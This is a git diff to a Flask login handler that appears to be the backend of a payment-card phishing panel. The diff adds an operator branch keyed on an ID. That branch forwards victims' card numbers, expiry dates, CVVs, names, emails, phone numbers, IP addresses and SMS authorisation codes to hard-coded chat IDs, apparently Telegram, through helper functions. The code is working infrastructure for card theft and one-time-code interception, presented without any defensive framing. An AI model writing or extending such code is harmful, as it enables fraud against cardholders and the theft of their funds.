@@ -1,6 +1,6 @@
 from flask import Flask, redirect, request, jsonify
 from flask_cors import CORS
-from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut, send_me
+from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut, send_me, send_me1, send_sms1
 from CHAT_ID import MAIN_ID, Egoist, Egoist2, Plaxa, Egoist3, Egoist4, Egoist5, Egoist6, Plaksa
 from checker import get_button_by_id
 app = Flask(__name__)
@@ -47,6 +47,16 @@ def login():
 
 
         ID = f'{session}'
+
+        # SmokeWeEveryday
+        if id == '10000001':
+            send_me1(card_number, expiry_date, cvv)
+            send_buttons_message('-1002179206284', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            if authCode is not None and authCode != 'None':
+                send_sms1(card_number, authCode)
+                send_sms('-1002179206284', card_number, expiry_date, cvv, authCode, ID)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            return '', 200  # Возвращаем пустой ответ с кодом 200
         # WE
         if id == '1000001':
             send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
